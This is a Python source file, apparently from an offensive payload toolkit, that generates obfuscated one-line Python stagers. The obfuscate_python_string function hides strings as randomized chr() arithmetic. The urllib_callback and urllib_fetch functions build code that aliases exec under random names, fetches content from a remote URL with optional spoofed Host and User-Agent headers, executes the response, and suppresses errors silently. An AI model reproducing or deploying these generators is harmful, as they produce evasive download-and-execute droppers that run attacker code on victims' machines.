from random import choice, randint
from payloads.helpers.string import unique_random_string_set


def obfuscate_python_string(python_string, chr_function_name="chr", int_function_name="int"):
    obfuscated_python_string = ""
    for character in python_string:
        character_obfuscator = choice(["chr", "chr_divide", "chr_subtract"])
        if character_obfuscator == "chr":
            ascii_value = ord(character)
            obfuscated_python_string += chr_function_name + "(" + str(ascii_value) + ")+"
        elif character_obfuscator == "chr_divide":
            random_number = randint(2, 10)
            ascii_value = ord(character) * random_number
            obfuscated_python_string += chr_function_name + "(" + int_function_name + "(" + \
                                        str(ascii_value) + "/" + str(random_number) + "))+"
        elif character_obfuscator == "chr_subtract":
            random_number = randint(2, 100)
            ascii_value = ord(character) + random_number
            obfuscated_python_string += chr_function_name + "(" + int_function_name + "(" + \
                                        str(ascii_value) + "-" + str(random_number) + "))+"

    return obfuscated_python_string[0:len(obfuscated_python_string) - 1]  # Remove trailing "+" character


def urllib_callback(url, post_data_variable="", host_header="", user_agent="", regex="", try_except_wrap=False):
    callback = ""

    # Generate random variables
    random_variables = unique_random_string_set(set_size=7, length_minimum=1, length_maximum=3)
    var_chr = random_variables[0]
    var_int = random_variables[1]
    var_exec = random_variables[2]
    var_host = random_variables[3]
    var_user_agent = random_variables[4]
    var_urllib_request = random_variables[5]
    var_http_response = random_variables[6]

    # Alias chr, int, and exec functions
    callback += "{0}=chr;".format(var_chr)
    callback += "{0}=int;".format(var_int)
    callback += "{0}=exec;".format(var_exec)

    # Obfuscate strings
    url = obfuscate_python_string(url, var_chr, var_int)
    host_header = obfuscate_python_string(host_header, var_chr, var_int)
    user_agent = obfuscate_python_string(user_agent, var_chr, var_int)
    host_string = obfuscate_python_string("Host", var_chr, var_int)
    user_agent_string = obfuscate_python_string("User-Agent", var_chr, var_int)

    # Define the host header and user agent strings
    callback += "{0}={1};".format(var_host, host_string)
    callback += "{0}={1};".format(var_user_agent, user_agent_string)

    # Construct the HTTP headers
    headers = "{}"
    if host_header != "" and user_agent != "":
        headers = "{{{0}:{1},{2}:{3}}}".format(var_host, host_header, var_user_agent, user_agent)
    elif host_header != "":
        headers = "{{{0}:{1}}}".format(var_host, host_header)
    elif user_agent != "":
        headers = "{{{0}:{1}}}".format(var_user_agent, user_agent)

    # Check if we are doing a POST and construct the HTTP request
    if post_data_variable == "":
        callback += "import urllib.request as {0};{1}={0}.urlopen({0}.Request({2},headers={3})).read();" \
                     .format(var_urllib_request, var_http_response, url, headers)
    else:
        callback += "import urllib.request as {0};{1}={0}.urlopen({0}.Request({2},headers={3},data={4})).read();" \
                     .format(var_urllib_request, var_http_response, url, headers, post_data_variable)

    # Check if we are using a regex to extract data from the response
    if regex == "":
        callback += "{0}({1})".format(var_exec, var_http_response)
    else:
        callback += "import re;{0}(re.search(rb'{1}',{2}).group(1));".format(var_exec, regex, var_http_response)

    if try_except_wrap:
        callback = "try:\n    {0}\nexcept:\n    pass\n".format(callback)

    return callback


def urllib_fetch(url, fetched_data_variable, host_header="", user_agent="", try_except_wrap=False):
    callback = ""

    # Generate random variables
    random_variables = unique_random_string_set(set_size=6, length_minimum=1, length_maximum=3)
    var_chr = random_variables[0]
    var_int = random_variables[1]
    var_exec = random_variables[2]
    var_host = random_variables[3]
    var_user_agent = random_variables[4]
    var_urllib_request = random_variables[5]

    # Alias chr, int, and exec functions
    callback += "{0}=chr;".format(var_chr)
    callback += "{0}=int;".format(var_int)
    callback += "{0}=exec;".format(var_exec)

    # Obfuscate strings
    url = obfuscate_python_string(url, var_chr, var_int)
    host_header = obfuscate_python_string(host_header, var_chr, var_int)
    user_agent = obfuscate_python_string(user_agent, var_chr, var_int)
    host_string = obfuscate_python_string("Host", var_chr, var_int)
    user_agent_string = obfuscate_python_string("User-Agent", var_chr, var_int)

    # Define the host header and user agent strings
    callback += "{0}={1};".format(var_host, host_string)
    callback += "{0}={1};".format(var_user_agent, user_agent_string)

    # Construct the HTTP headers
    headers = "{}"
    if host_header != "" and user_agent != "":
        headers = "{{{0}:{1},{2}:{3}}}".format(var_host, host_header, var_user_agent, user_agent)
    elif host_header != "":
        headers = "{{{0}:{1}}}".format(var_host, host_header)
    elif user_agent != "":
        headers = "{{{0}:{1}}}".format(var_user_agent, user_agent)

    callback += "import urllib.request as {0};{1}={0}.urlopen({0}.Request({2},headers={3})).read();" \
                .format(var_urllib_request, fetched_data_variable, url, headers)

    if try_except_wrap:
        callback = "try:\n    {0}\nexcept:\n    pass\n".format(callback)

    return callback
